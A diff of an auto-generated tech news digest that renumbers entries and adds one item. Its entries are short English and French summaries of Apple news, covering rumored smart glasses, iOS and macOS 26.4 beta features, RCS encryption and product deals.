-### 46. `EN` [Move over Meta: Apple smart glasses are coming](data/articles/fefce4c965b9d29ce74881261a4df0f3.html)
+### 48. `EN` [Move over Meta: Apple smart glasses are coming](data/articles/fefce4c965b9d29ce74881261a4df0f3.html)
 **Source:** Macworld | **Keyword:** `Apple`
 Macworld In a new report by Bloomberg’s Mark Gurman, Apple has three wearable devices in the works that could establish Apple as a leader in AI hardware. Apple is “ramping up work” on smart glasses, a pendant, and AirPods with IR cameras. The three devices will not be stand-alone products and will require an iPhone connection. Apple smart glasses
 Smart glasses appear to be the priority for Apple—don’t expect Apple glasses to be an augmented reality version of its Vision Pro headset. These glasses will be more like the Meta AI glasses, with a high-resolution camera capturing photos and video. The UI will depend on speakers, microphones, and a separate camera dedicated to “give the device environmental context.” Users will be able to make phone calls, use Siri, play music, and shoot photos. Also, the user will be able to “take actions based on surroundings.”
@@ -5434,7 +5478,7 @@ Gurman stated that Apple made “significant progress” in the development of t
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 47. `EN` [Apple eyes 2027 for AI smart glasses built around context, not screens](data/articles/4b0917e89282aabe5859f995b525185a.html)
+### 49. `EN` [Apple eyes 2027 for AI smart glasses built around context, not screens](data/articles/4b0917e89282aabe5859f995b525185a.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Apple is accelerating development of AI-powered smart glasses designed to pair with iPhone, with production targeted for late 2026 and a potential launch in 2027. Apple Vision Pro might get a slimmer companion
 
@@ -5442,7 +5486,7 @@ Apple is accelerating development of AI-powered smart glasses designed to pair w
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 48. `EN` [Apple’s new Home products could include two unexpected additions: report](data/articles/3dd3ea465b36b00b9c5a8663dbf1fdb0.html)
+### 50. `EN` [Apple’s new Home products could include two unexpected additions: report](data/articles/3dd3ea465b36b00b9c5a8663dbf1fdb0.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Rumors indicate Apple has big plans for a new smart home push, with several new Home products and accessories launching in the year ahead. And per a new report, there are two additional Home products in the works.
 more…
@@ -5451,7 +5495,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 49. `EN` [Apple Releases First macOS Tahoe 26.4 Public Beta](data/articles/5c66edac0a616a7fadc289c8b2917ba2.html)
+### 51. `EN` [Apple Releases First macOS Tahoe 26.4 Public Beta](data/articles/5c66edac0a616a7fadc289c8b2917ba2.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 Apple today provided public beta testers with the first release of an upcoming macOS Tahoe 26.4 update for testing purposes. The public beta comes a day after Apple provided the beta to developers. After signing up for beta testing on Apple's beta site, public beta testers can download the updates using the Software Update section in the System Settings app. has been reimplemented in Safari for those who missed having the option in earlier versions of ‌macOS Tahoe‌, and there is a new Charge Limit feature that lets Mac users select a maximum charge level that ranges from 80 percent to 100 percent. Apple silicon Mac users will see now see warnings about apps that are still using Rosetta 2, because Apple is phasing out Rosetta after macOS 27. ‌macOS Tahoe‌ is also the final version of macOS that will run on Intel-based Macs, and Apple is working to remove all lingering Intel features. Related Roundup: macOS Tahoe
 Related Forum: macOS Tahoe
@@ -5462,7 +5506,7 @@ Discuss this article in our forums
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 50. `EN` [Qualcomm iPhone modem cost inflation suit in UK ends with undisclosed agreement](data/articles/a1a2112c7cf579ebf69c9dd40f1e579c.html)
+### 52. `EN` [Qualcomm iPhone modem cost inflation suit in UK ends with undisclosed agreement](data/articles/a1a2112c7cf579ebf69c9dd40f1e579c.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 A long-running UK challenge to what Qualcomm charged Apple for smartphone modems has concluded, as the consumer group that filed the case has chosen to end it after years of litigation. UK group drops Qualcomm royalty lawsuit
 British consumer group Which? is withdrawing a five-year-long case against Qualcomm seeking damages over artificially inflated prices on iPhone modems. Initially, the group sought damages of more than $650 million for 29 million customers in the UK.
@@ -5472,7 +5516,7 @@ In 2021, consumer group "Which?" launched the lawsuit against Qualcomm, claiming
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Macworld">
 
-### 51. `EN` [iOS 26.4 beta is out with no sign of the new Siri](data/articles/393ae1ca73588b5c61ea3272119a218c.html)
+### 53. `EN` [iOS 26.4 beta is out with no sign of the new Siri](data/articles/393ae1ca73588b5c61ea3272119a218c.html)
 **Source:** Macworld | **Keyword:** `Apple`
 Macworld After Apple released iOS 26.3 last week, we were anticipating the first beta release of iOS 26.4 with bated breath. That’s because rumors for the better part of a year have pointed to this update as the one to bring the revamped Siri that has been expected since 2024. However, a rumor last week dampened those expectations considerably. Now it’s unclear if the 26.4 updates will have any of the “new Siri” at all, while some of its major features get pushed back.
 Still, 26.4 seems like it should be a larger-than-usual update with several new features that aren’t Siri related.
@@ -5505,7 +5549,7 @@ Find out everything you need to know about iOS 26 in our iOS 26 superguide.
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Macworld">
 
-### 52. `EN` [Finally! Apple adds MacBook battery charge limit to macOS 26.4](data/articles/f21e1592d93664ec8f217c299fab413a.html)
+### 54. `EN` [Finally! Apple adds MacBook battery charge limit to macOS 26.4](data/articles/f21e1592d93664ec8f217c299fab413a.html)
 **Source:** Macworld | **Keyword:** `Apple`
 Macworld Apple released the macOS 26.4 beta to developers on Monday, and those who have installed it have found a new feature that’s been a long time a-comin’. Apple is adding the ability to set a charge limit for the battery in a MacBook. With the new slider, you can set the limit to 80 percent, to 100 percent, or to an increment (in fives) in between. OH MY GAWD ! ! ! ! ! !
 Charge limit option added in Tahoe 26.4 Beta!!!!! pic.twitter.com/SxNgMV3YsP
@@ -5517,7 +5561,7 @@ There is one drawback to Apple adding this feature: The main feature of AlDente,
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 53. `EN` [How to manage notifications on macOS 26](data/articles/ac79a779ba89c64d218ab9ad2245c676.html)
+### 55. `EN` [How to manage notifications on macOS 26](data/articles/ac79a779ba89c64d218ab9ad2245c676.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 If your Mac's alerts are becoming a distraction, macOS Tahoe 26 includes simple settings that let you fine-tune how and when notifications appear. How to manage notifications on macOS Tahoe
 If you're like the rest of us, chances are you're getting a little tired of constant notifications from your devices. While this mostly happens on iPhone, you still can get quite a few notifications on Mac.
@@ -5527,7 +5571,7 @@ There aren't too many settings to change on Mac, but there are a few you should 
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 54. `FR` [Apple Creator ou Adobe Cloud ? Voici la meilleure suite](data/articles/cb59e9373ae9b95d37fa27fd8042e77a.html)
+### 56. `FR` [Apple Creator ou Adobe Cloud ? Voici la meilleure suite](data/articles/cb59e9373ae9b95d37fa27fd8042e77a.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 L'un se démarque par la variété des outils proposés, l'autre par l'intégration.
 
@@ -5535,7 +5579,7 @@ L'un se démarque par la variété des outils proposés, l'autre par l'intégrat
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Macworld">
 
-### 55. `EN` [Cosmic Orange gift guide: 30 gifts to match the ultra-bright iPhone 17 Pro](data/articles/6c6a5d52959beff97f831e06e99b6512.html)
+### 57. `EN` [Cosmic Orange gift guide: 30 gifts to match the ultra-bright iPhone 17 Pro](data/articles/6c6a5d52959beff97f831e06e99b6512.html)
 **Source:** Macworld | **Keyword:** `Apple`
 Macworld Apple stunned the world with its bold new Cosmic Orange color for the iPhone 17 Pro and 17 Pro Max. I can’t even name the other colors they are available in… Dark Blue? Sort of White? Who cares? It has to be orange!
 Decision made, now comes the real challenge: accessorizing. If you’re going to walk around with a phone that looks like a tiny glowing sunset, you can’t just pair it with any random case, cable, or charger. This is a color that demands commitment.
@@ -5558,7 +5602,7 @@ Fortunately, Tim Cook has forgotten the Tangerine Nightmare, and you can buy a c
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 56. `FR` [macOS Tahoe 26.4 : Apple fait attention à la batterie de votre ordinateur](data/articles/29852eec712e2633c4bf4cede16b0e95.html)
+### 58. `FR` [macOS Tahoe 26.4 : Apple fait attention à la batterie de votre ordinateur](data/articles/29852eec712e2633c4bf4cede16b0e95.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple vient de lancer une mise à jour sur ses Mac. Elle vient en aide à votre batterie.
 
@@ -5566,7 +5610,7 @@ Apple vient de lancer une mise à jour sur ses Mac. Elle vient en aide à votre 
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 57. `EN` [Feature Request: Give us more control over iPhone Mirroring privacy](data/articles/ff530c7abd5f8d159482fc5f967d4690.html)
+### 59. `EN` [Feature Request: Give us more control over iPhone Mirroring privacy](data/articles/ff530c7abd5f8d159482fc5f967d4690.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 For me iPhone Mirroring has been one of the most useful enhancements to the Apple ecosystem in recent years, and is something I use on a daily basis.
 However, while I completely understand Apple’s focus on privacy protection, for my usage the way it works at present is simply annoying …
@@ -5576,7 +5620,7 @@ more…
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 58. `FR` [Apple fait évoluer ses AirPods, voici comment faire la mise à jour chez vous](data/articles/aad066a38542721ee0a15ece1ab909f6.html)
+### 60. `FR` [Apple fait évoluer ses AirPods, voici comment faire la mise à jour chez vous](data/articles/aad066a38542721ee0a15ece1ab909f6.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple vient de mettre à jour ses AirPods, voici installer cette nouvelle version.
 
@@ -5584,7 +5628,7 @@ Apple vient de mettre à jour ses AirPods, voici installer cette nouvelle versio
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 59. `EN` [Stick with Apple, an increasingly bullish Wedbush tells investors](data/articles/e5eb5fec1c76baaa9ce39d0fe5c6a299.html)
+### 61. `EN` [Stick with Apple, an increasingly bullish Wedbush tells investors](data/articles/e5eb5fec1c76baaa9ce39d0fe5c6a299.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Investment firm Wedbush is telling its clients to ignore recent reports of delays to Siri, saying that 2026 is when Apple Intelligence will be a boon. The new Siri is coming
 Wedbush took its Apple target price up to $350 in December 2025, based on high expectations for Apple Intelligence. Keeping that figure, it then repeated this expectation in January 2026 — and is now back to do so again, specifically because of recent rumors.
@@ -5594,7 +5638,7 @@ Those rumors claimed that testing of the new Siri is going poorly, and its impro
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 60. `FR` [iOS 26.4 : Apple intègre les RCS mais de la façon la plus frustrante possible](data/articles/2bfa8d0f3d61af6ccfb76ca5d352b9bd.html)
+### 62. `FR` [iOS 26.4 : Apple intègre les RCS mais de la façon la plus frustrante possible](data/articles/2bfa8d0f3d61af6ccfb76ca5d352b9bd.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple vient de lancer les RCS dans sa première version bêta d'iOS 26.4, mais nous sommes encore loin du compte.
 
@@ -5602,7 +5646,7 @@ Apple vient de lancer les RCS dans sa première version bêta d'iOS 26.4, mais n
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 61. `FR` [En attendant Siri, Apple soigne vos fonds d’écran avec iOS 26.4](data/articles/2743e35df336dcdd7cf8937f898c2e37.html)
+### 63. `FR` [En attendant Siri, Apple soigne vos fonds d’écran avec iOS 26.4](data/articles/2743e35df336dcdd7cf8937f898c2e37.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Apple vient de lancer une nouvelle fonctionnalité pour vous faire changer de fond d'écran sur votre iPhone.
 
@@ -5610,7 +5654,7 @@ Apple vient de lancer une nouvelle fonctionnalité pour vous faire changer de fo
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 62. `FR` [Le capteur Ugreen compatible Localiser à 8 € fait trembler Apple et ses AirTags](data/articles/8c34cfea02eaf19999ef1d65fdf8004f.html)
+### 64. `FR` [Le capteur Ugreen compatible Localiser à 8 € fait trembler Apple et ses AirTags](data/articles/8c34cfea02eaf19999ef1d65fdf8004f.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Ces quatre traceurs d'objets Ugreen sont au prix d'un seul AirTag en ce moment.
 
@@ -5618,7 +5662,7 @@ Ces quatre traceurs d'objets Ugreen sont au prix d'un seul AirTag en ce moment.
 
 <div class="article-item" data-lang="fr" data-category="mac" data-source="iPhoneAddict">
 
-### 63. `FR` [Apple Music peut créer la playlist de vos rêves sur iOS 26.4](data/articles/a4211110a41dac719db1459e7b8c5721.html)
+### 65. `FR` [Apple Music peut créer la playlist de vos rêves sur iOS 26.4](data/articles/a4211110a41dac719db1459e7b8c5721.html)
 **Source:** iPhoneAddict | **Keyword:** `Apple`
 Il suffit d'un simple prompt à l'IA pour le faire.
 
@@ -5626,7 +5670,7 @@ Il suffit d'un simple prompt à l'IA pour le faire.
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 64. `EN` [A code snippet in iOS 26.4 shows Apple TV is coming to CarPlay](data/articles/a093a12ce4c7be0cf005abf603c64f2e.html)
+### 66. `EN` [A code snippet in iOS 26.4 shows Apple TV is coming to CarPlay](data/articles/a093a12ce4c7be0cf005abf603c64f2e.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 A code snippet discovered in iOS 26.4 shows that CarPlay could gain an Apple TV app for playback while parked, though the implementation details aren't available. Apple TV is coming to CarPlay
 Apple has quietly been adding video playback to CarPlay in iOS 26, but the feature requires the vehicle to be parked. Code discovered in the iOS 26.4 beta suggests that the Apple TV could be coming to the platform.
@@ -5636,7 +5680,7 @@ According to the code shared by user Aaronp613 on X, users will be asked to log 
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 65. `EN` [Twelve South Valet review: A bespoke catchall MagSafe charger that could be faster](data/articles/613b15820aa7577466602c51d8c25085.html)
+### 67. `EN` [Twelve South Valet review: A bespoke catchall MagSafe charger that could be faster](data/articles/613b15820aa7577466602c51d8c25085.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Twelve South's latest accessory is a bespoke, leather-laden valet that will charge your iPhone with an elevated MagSafe-compatible perch and is impressively customizable. Twelve South Valet review: A sleek leather catchall with MagSafe charging
 Like it or not, chargers are a necessary evil in our lives. Realistically, they will likely remain so for the foreseeable future.
@@ -5646,7 +5690,7 @@ When examining the available models on the market, which are numerous, several f
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 66. `EN` [New in iOS 26.4 beta 1: Videos in Podcasts, Playlist Playground, RCS, more](data/articles/82ca371d77b043a3278feb231e6e6806.html)
+### 68. `EN` [New in iOS 26.4 beta 1: Videos in Podcasts, Playlist Playground, RCS, more](data/articles/82ca371d77b043a3278feb231e6e6806.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 The first developer beta of iOS 26.4 is here, offering a new video experience for Apple Podcasts, support for testing end-to-end encrypted RCS messaging, and much more. iOS 26.4 beta 1 includes a new video experience for Apple Podcasts, and support for end-to-end encrypted RCS messaging.
 On Monday, less than a week after iOS 26.3 made its way to the general public, Apple started the iOS 26.4 beta testing cycle. The iPhone software update has the build number 23E5207q, up from 23D127 on the public release of iOS 26.3.
@@ -5656,7 +5700,7 @@ As a whole, iOS 26 and iPadOS 26 introduced a variety of changes, the most visib
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 67. `EN` [iOS 26.4 beta 1: Here are the new iPhone features](data/articles/69ec514dfca7dc2770098ffcaec15068.html)
+### 69. `EN` [iOS 26.4 beta 1: Here are the new iPhone features](data/articles/69ec514dfca7dc2770098ffcaec15068.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 iOS 26.4 beta 1 is now available in beta for developers. The update includes a ton of new features and changes for iPhone users. There are new changes to the Music app, Messages, Apple Podcasts, and much more. Head below for the full roundup of all the new features in iOS 26.4 beta 1. Update February 17, 2026: Now available for public beta testers as well. more…
 
@@ -5664,7 +5708,7 @@ iOS 26.4 beta 1 is now available in beta for developers. The update includes a t
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 68. `EN` [iOS 26.4 has iPhone Stolen Device Protection on by default](data/articles/be3a659ab730ff0bc08a770733d41531.html)
+### 70. `EN` [iOS 26.4 has iPhone Stolen Device Protection on by default](data/articles/be3a659ab730ff0bc08a770733d41531.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Three years after the feature rolled out, Apple is automatically enabling Stolen Device Protection in iOS 26.4, expanding safeguards against an ever-expanding epidemic of iPhone theft. How to use Stolen Device Protection
 In 2023, Apple rolled out a new feature called Stolen Device Protection. The feature is designed to prevent iPhones from being accessed if a thief manages to both learn a user's passcode and steal their iPhone.
@@ -5674,7 +5718,7 @@ This was a crucial change, as more and more reports rolled in, showing that this
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 69. `EN` [iOS 26.4 will activate key theft prevention feature on all iPhones](data/articles/4b17313451e0dfd3aba7a1c28217f035.html)
+### 71. `EN` [iOS 26.4 will activate key theft prevention feature on all iPhones](data/articles/4b17313451e0dfd3aba7a1c28217f035.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 iOS 26.4 is the next big iPhone software release, and Apple plans to enable a key security feature by default in the update.
 more…
@@ -5683,7 +5727,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 70. `EN` [RCS encryption surfaces in iOS 26.4 developer beta, but testing is extremely limited](data/articles/31fd4f805c8ddc1c483daf95546e3a44.html)
+### 72. `EN` [RCS encryption surfaces in iOS 26.4 developer beta, but testing is extremely limited](data/articles/31fd4f805c8ddc1c483daf95546e3a44.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Apple has taken a small step toward securing cross-platform messaging, with early RCS encryption support now appearing in the iOS 26.4 beta. Just don't expect to get that much testing done right now. RCS support will be extended to include end-to-end encryption
 Way back in March 2025, Apple announced that it would add support for end-to-end encryption to RCS messaging on iPhone. At the time, there were very few details about when the feature would be implemented.
@@ -5693,7 +5737,7 @@ We got our first hint that the feature was, at the very least, being worked on i
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 71. `EN` [iOS 26.4 beta adds support for testing end-to-end encrypted RCS messaging](data/articles/beafd7db46206026afe83059808ddf28.html)
+### 73. `EN` [iOS 26.4 beta adds support for testing end-to-end encrypted RCS messaging](data/articles/beafd7db46206026afe83059808ddf28.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple added RCS support to iPhone with iOS 18.1, enabling richer cross-platform messaging between iPhone and Android users. This included things like typing indicators, read receipts, and high-resolution photo and video attachments.
 Last March, Apple announced its plans to add support for end-to-end encryption for RCS messages.
@@ -5704,7 +5748,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 72. `EN` [Apple releases iOS 26.4 beta 1 for iPhone, here’s what’s new](data/articles/53fa47d1c91020ab37f217632cae7a08.html)
+### 74. `EN` [Apple releases iOS 26.4 beta 1 for iPhone, here’s what’s new](data/articles/53fa47d1c91020ab37f217632cae7a08.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple has released the first iOS 26.4 beta for iPhone. While we originally expected iOS 26.4 to include upgraded Siri, it sounds like we won’t see those changes just yet. more…
 
@@ -5712,7 +5756,7 @@ Apple has released the first iOS 26.4 beta for iPhone. While we originally expec
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 73. `EN` [iPad Pro rumored to not get major design changes for many years](data/articles/42680c3ccd1d392b890329ef4437f4a6.html)
+### 75. `EN` [iPad Pro rumored to not get major design changes for many years](data/articles/42680c3ccd1d392b890329ef4437f4a6.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 A new rumor claims Apple has no major redesign imminent for the iPad Pro, potentially leaving the flagship tablet in an extended cycle of incremental updates. iPad Pro might not see updates for a while
 On February 16, Instant Digital posted that Apple won't be redesigning the iPad Pro significantly for a while. The report indicates that Apple will stick to routine chip updates without making major changes to the device's design.
@@ -5723,7 +5767,7 @@ Instant Digital has had a mixed track record with Apple leaks on Weibo. Sometime
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 74. `EN` [Tesla CarPlay delay caused by fears of slow iOS 26 adoption rates](data/articles/9c61ee09b85322fd88406ca48b9d3076.html)
+### 76. `EN` [Tesla CarPlay delay caused by fears of slow iOS 26 adoption rates](data/articles/9c61ee09b85322fd88406ca48b9d3076.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Tesla's lack of CarPlay support is allegedly down to the slow adoption of iOS 26, with a Maps compatibility fix supposedly one of the last hurdles in CarPlay's way. A Tesla, without CarPlay
 Tesla has long been one of the holdouts when it comes to CarPlay support. While there have been many rumors about CarPlay finally making its way to Tesla's impressive in-car infotainment system, it has still yet to appear.
@@ -5732,7 +5776,7 @@ Tesla has long been one of the holdouts when it comes to CarPlay support. While 
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 75. `EN` [Apple isn't compromising build quality with new, colorful, inexpensive MacBook](data/articles/29e1210fd42c942e2bc44bdd4265e25d.html)
+### 77. `EN` [Apple isn't compromising build quality with new, colorful, inexpensive MacBook](data/articles/29e1210fd42c942e2bc44bdd4265e25d.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Apple's budget MacBook is reportedly not plastic, and is rumored to get vibrant colors echoing the the 24-inch iMac for its aluminum enclosure. Apple's MacBook could be green
 The MacBook Air and MacBook Pro lines are relatively limited when it comes to appearance, with the Air sold in four muted shades and the Pro in just two. When it comes to the much-rumored MacBook with an iPhone chip, it could expand the external color palette a lot more.
@@ -5741,7 +5785,7 @@ The MacBook Air and MacBook Pro lines are relatively limited when it comes to ap
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 76. `EN` [iOS 27 expected to deliver better battery life even if you have an older iPhone](data/articles/95753d34f60fefa310276a728311f263.html)
+### 78. `EN` [iOS 27 expected to deliver better battery life even if you have an older iPhone](data/articles/95753d34f60fefa310276a728311f263.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Apple is reportedly devoting iOS 27 development time to revamp older parts of the iPhone operating system, aiming to increase battery life by improving performance. iOS 27 is now expected to feature performance and battery life improvements
 It's already been claimed that iOS 27 will concentrate on Apple Intelligence, but also that Apple's internal code names for the work have recently changed. Now Bloomberg says that a major focus for the operating system update will be about reworking existing elements.
@@ -5751,7 +5795,7 @@ Specifically, Apple is said to be rewriting parts of iOS for the new update. it'
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 77. `EN` [Here’s why M5 MacBook Pro is still worth buying, even as redesign rumors loom](data/articles/36c9d3073c9fc513cdd6314948c64e46.html)
+### 79. `EN` [Here’s why M5 MacBook Pro is still worth buying, even as redesign rumors loom](data/articles/36c9d3073c9fc513cdd6314948c64e46.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 The current 14-inch MacBook Pro design is nearing five years old. It’s also not at all a secret that Apple is working on a redesign for its MacBook Pro lineup.
 Despite those facts though, there’s still one compelling argument to be made about buying one today – even with bigger changes right around the horizon.
@@ -5761,7 +5805,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 78. `EN` [These rumored iPhone 18 Pro features might tempt you to upgrade later this year](data/articles/5eb6ea3cc943514194e13f1805410b24.html)
+### 80. `EN` [These rumored iPhone 18 Pro features might tempt you to upgrade later this year](data/articles/5eb6ea3cc943514194e13f1805410b24.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Later this year, Apple will once again unveil a full set of flagship iPhones. It may feel like iPhone 17 Pro is still pretty recent, but actually – it’s already been five months. Out of everything in the rumor mill, iPhone Fold certainly sounds the most interesting – but there’s still a few interesting upgrades coming to the iPhone 18 Pro.
 more…
@@ -5770,7 +5814,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 79. `EN` [iPhone 18 Pro could get next-gen N2 chip, pushing an exciting trend](data/articles/07206e9ca7e86da7abd79072b7e42479.html)
+### 81. `EN` [iPhone 18 Pro could get next-gen N2 chip, pushing an exciting trend](data/articles/07206e9ca7e86da7abd79072b7e42479.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 iPhone 18 Pro is rumored to get a next-gen C2 modem, enabling several new advantages for Apple’s flagship. But an analyst report says there’s a new N2 chip coming to iPhone 18 Pro as well, continuing an exciting trend.
 more…
@@ -5779,7 +5823,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 80. `EN` [Are people updating to iOS 26? Here’s Apple’s official data](data/articles/577546155bc6a1850a43b506dbb67a4f.html)
+### 82. `EN` [Are people updating to iOS 26? Here’s Apple’s official data](data/articles/577546155bc6a1850a43b506dbb67a4f.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple has released the highly-anticipated adoption statistics for iOS 26 for the first time. The company says that 74% of all devices introduced in the last four years are running iOS 26, while 66% of all devices are running iOS 26. more…
 
@@ -5787,7 +5831,7 @@ Apple has released the highly-anticipated adoption statistics for iOS 26 for the
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
 
-### 81. `EN` [Again, don't count on Mac Studio stock levels for release timing](data/articles/501fe6e112e9fc3ab206c7f62b92d751.html)
+### 83. `EN` [Again, don't count on Mac Studio stock levels for release timing](data/articles/501fe6e112e9fc3ab206c7f62b92d751.html)
 **Source:** AppleInsider | **Keyword:** `Apple`
 Following reports of dwindling stocks of the iPhone 16e, there are now ones about the Mac Studio. While a new one is coming, in 2026 there are just too many external factors to use it as a reliable indicator of an imminent launch. Two Mac Studios, stacked
 It seems such an obvious thing — if Apple is running low on the Mac Studio, it's because a new one is coming. And it seems such an easy thing to spot, since the online Apple Store details how long the delivery time is for any item.
@@ -5797,7 +5841,7 @@ So if you used to be able to get a custom Mac Studio the day after tomorrow in m
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 82. `EN` [iOS 26.3 adds unique new privacy feature, and it’s Apple at its best](data/articles/a6702836c4e8e10907a39095a9e464d2.html)
+### 84. `EN` [iOS 26.3 adds unique new privacy feature, and it’s Apple at its best](data/articles/a6702836c4e8e10907a39095a9e464d2.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 iOS 26.3 is the latest iPhone software update, and one of its most interesting new features is a privacy setting—‘Limit Precise Location’—that reveals Apple at its best.
 more…
@@ -5806,7 +5850,7 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="9to5Mac">
 
-### 83. `EN` [Apple has new ‘iPhone Flip’ model in the works, says leaker](data/articles/74a39c55bf0a4a1098b682b2de7b81c6.html)
+### 85. `EN` [Apple has new ‘iPhone Flip’ model in the works, says leaker](data/articles/74a39c55bf0a4a1098b682b2de7b81c6.html)
 **Source:** 9to5Mac | **Keyword:** `Apple`
 Apple’s first foldable iPhone launches this fall, but we’re increasingly hearing that there’s an entirely different folding design in the works too: an ‘iPhone Flip.’
 more…
@@ -5815,15 +5859,25 @@ more…
 
 <div class="article-item" data-lang="en" data-category="mac" data-source="Apple Newsroom">
 
-### 84. `EN` [Apple Sports adds golf to its lineup](data/articles/958099c47276b5d7589f45ae0aacff6d.html)
+### 86. `EN` [Apple Sports adds golf to its lineup](data/articles/958099c47276b5d7589f45ae0aacff6d.html)
 **Source:** Apple Newsroom | **Keyword:** `Apple`
 Apple Sports — the free app for iPhone — today added golf to its growing list of supported sports.
 
 </div>
 
+<div class="article-item" data-lang="en" data-category="mac" data-source="AppleInsider">
+
+### 87. `EN` [March madness: What Apple is getting ready to launch](data/articles/f5a133379ebbc4490c69003ef82a7083.html)
+**Source:** AppleInsider | **Keyword:** `Apple`
+With an Apple experience on March 4, the rumor mill is in overdrive. These are the best candidates — and the also-rans — for what Apple will launch and then have an "experience" to demo on March 4. The more likely Apple launches for early March
+It seems the March 4 Apple Experience won't be an actual launch of new products in Apple's catalog, but instead capping off multiple announcements during the week. That gives Apple a lot of opportunity to promote multiple items.
+With the breadth of rumored devices on the docket, including many anticipated for launch in early 2026. it certainly needs that opportunity. But, as ever, some have more chance of making an appearance than others. Continue Reading on AppleInsider | Discuss on our Forums
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="mac" data-source="MacRumors">
 
-### 85. `EN` [Samsung Expands Monitor Sale With Up to 58% Off on Amazon](data/articles/25be5a8412e01d1a64f9774296d4922c.html)
+### 88. `EN` [Samsung Expands Monitor Sale With Up to 58% Off on Amazon](data/articles/25be5a8412e01d1a64f9774296d4922c.html)
 **Source:** MacRumors | **Keyword:** `Apple`
 Last week, we started tracking a big Samsung sale on Amazon, including the return of the all-time low price on the newest Smart Monitor. This week, Samsung has expanded this sale to include even more monitors at all-time low prices, and it still includes the 32-inch Smart Monitor M9 for $1,299.99, down from $1,599.99. Note: MacRumors is an affiliate partner with Amazon. When you click a link and make a purchase, we may receive a small payment, which helps us keep the site running. This model of the Smart Monitor launched last summer, and today's sale is a match of the best price we've ever tracked, which is typically at Samsung.com. Today is one of the few times we've seen this low price on Amazon, and it has an estimated delivery date between February 20 and February 23. $300 OFF
 Samsung 32-Inch Smart Monitor M9 for $1,299.99 $849.99, down from $1,999.99. This is a massive 58 percent discount on the monitor, hitting a new all-time low price on Amazon. $1,150 OFF
